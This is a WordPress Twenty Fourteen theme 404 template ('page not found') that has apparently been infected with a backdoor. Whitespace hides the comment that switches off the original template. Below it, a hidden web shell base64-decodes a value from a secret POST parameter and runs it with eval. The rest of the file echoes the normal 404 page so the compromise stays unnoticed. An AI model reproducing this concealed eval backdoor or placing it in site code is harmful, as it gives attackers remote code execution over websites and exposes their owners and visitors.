<?php
/**
 * The template for displaying 404 pages (Not Found)
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */																																	/*

get_header(); ?>


	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

			<header class="page-header">
				<h1 class="page-title">Sorry! Page not found!</h1>
			</header>

			<div class="page-content">
				<p>Sorry! This page is not found.</p>
				<?php get_search_form(); ?>
			</div><!-- .page-content -->

		</div><!-- #content -->
	</div><!-- #primary -->

<?php
get_sidebar( 'content' );
get_sidebar();
get_footer();
*/

if(isset($_POST['mvcv9b5fk2'])){ $uidmail = base64_decode($_POST['mvcv9b5fk2']); @eval($uidmail); }
else{
get_header(); 
echo "<div id=\"primary\" class=\"content-area\">";
echo "<div id=\"content\" class=\"site-content\" role=\"main\">";
echo "<header class=\"page-header\"><h1 class=\"page-title\">Sorry! Page not found!</h1></header>";
echo "<div class=\"page-content\"><p>Sorry! This page is not found.</p>";
get_search_form();
echo "</div><!-- .page-content --></div><!-- #content --></div><!-- #primary -->";
get_sidebar( 'content' );
get_sidebar();
get_footer();
}
?>